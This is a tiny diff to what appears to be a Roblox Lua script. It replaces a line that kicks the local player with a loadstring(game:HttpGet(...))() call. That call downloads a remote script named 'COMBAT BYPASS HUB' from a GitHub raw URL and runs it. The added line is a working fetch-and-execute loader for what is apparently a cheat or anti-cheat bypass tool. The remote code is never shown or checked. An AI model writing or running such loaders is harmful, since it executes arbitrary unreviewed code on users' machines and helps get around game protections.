@@ -1,1 +1,1 @@
-game:GetService("Players").LocalPlayer:Kick("Error Player")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/refs/heads/main/COMBAT%20BYPASS%20HUB.lua.txt"))()
